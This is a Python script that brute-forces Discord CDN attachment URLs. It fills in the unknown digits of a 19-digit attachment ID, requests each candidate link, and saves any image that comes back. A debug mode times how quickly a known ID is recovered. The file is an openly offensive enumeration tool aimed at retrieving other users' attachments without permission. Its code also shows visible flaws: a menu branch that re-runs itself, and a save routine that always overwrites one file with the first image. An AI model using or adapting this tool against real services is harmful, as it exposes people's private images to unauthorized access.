import itertools
import string
import time
import requests

chars = string.digits
images = []


def run():
    choice = int(input("Choose program run mode (1 - normal, 2 - debug): "))
    if choice == 1:
        run_normal()
    if choice == 2:
        run_debug()
    else:
        run()


def run_normal():
    id_length = 19

    # Link Format: first_link_part + (known_id_part + guess) + third_link_part
    first_link_part = input("Enter known part of link "
                            "(example: https://cdn.discordapp.com/attachments/853455468504416266/):\n")
    known_id_part = input("Enter known part of ID (example: 103):\n")
    third_link_part = "/unknown.png"

    start_time = time.time()
    print(brute_id_normal(first_link_part, known_id_part, third_link_part, id_length))
    print("--- %s seconds ---" % (time.time() - start_time))
    print("Images found: ", len(images))


def run_debug():
    id_length = 19

    # Link Format: first_link_part + (known_id_part + guess) + third_link_part
    first_link_part = input("Enter known part of link "
                            "(example: https://cdn.discordapp.com/attachments/853455468504416266/):\n")
    real_id = input("Enter real ID (example: 1033463931253047436): ")
    if not len(real_id) == id_length:
        print("Invalid ID!")
        run_debug()
    digits_to_guess = int(input("Enter amount of digits to guess: "))
    third_link_part = "/unknown.png"

    start_time = time.time()
    print(brute_id_debug(first_link_part, real_id, third_link_part, digits_to_guess))
    print("--- %s seconds ---" % (time.time() - start_time))
    print("Images found: ", len(images))


def brute_id_normal(first_link_part, known_id_part, third_link_part, id_length):
    guess_length = id_length - len(known_id_part)
    for guess in itertools.product(chars, repeat=guess_length):
        guess = ''.join(guess)

        response = requests.get(first_link_part + known_id_part + guess + third_link_part)
        if response.status_code == 200:
            images.append(response.content)
            download_images()


def brute_id_debug(first_link_part, real_id, third_link_part, digits_to_guess):
    real_id = real_id[:len(real_id) - digits_to_guess]
    for guess in itertools.product(chars, repeat=digits_to_guess):
        guess = ''.join(guess)

        print("Guess: ", first_link_part + real_id + guess + third_link_part)
        response = requests.get(first_link_part + real_id + guess + third_link_part)
        if response.status_code == 200:
            images.append(response.content)
            download_images()


def download_images():
    with open('C:/Users/user/Desktop/image.jpg', 'wb') as handler:
        handler.write(images[0])


run()
